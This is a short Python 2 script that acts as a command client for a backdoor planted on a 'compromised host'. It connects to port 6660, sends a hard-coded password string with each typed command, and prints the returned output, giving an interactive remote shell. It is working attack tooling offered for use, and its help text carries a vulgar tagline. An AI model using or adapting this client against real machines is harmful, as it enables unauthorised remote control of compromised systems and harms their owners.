#!/usr/bin/python
# by amon (amon@nandynarwhals.org)

import socket
import argparse
import sys

parser = argparse.ArgumentParser(description='Pwn some bitches.')
parser.add_argument('host', help='compromised host')
args = parser.parse_args()

while True:
    sys.stdout.write("$ ")
    cmd = sys.stdin.readline().strip()
    s = socket.socket()
    s.connect((args.host, 6660))
    s.send("DoYouHearThePeopleSing?:::" + cmd + "\n")
    total_data=[]
    while True:
        data = s.recv(8192)
        if not data: break
        total_data.append(data)
    total_data = ''.join(total_data)
    print total_data
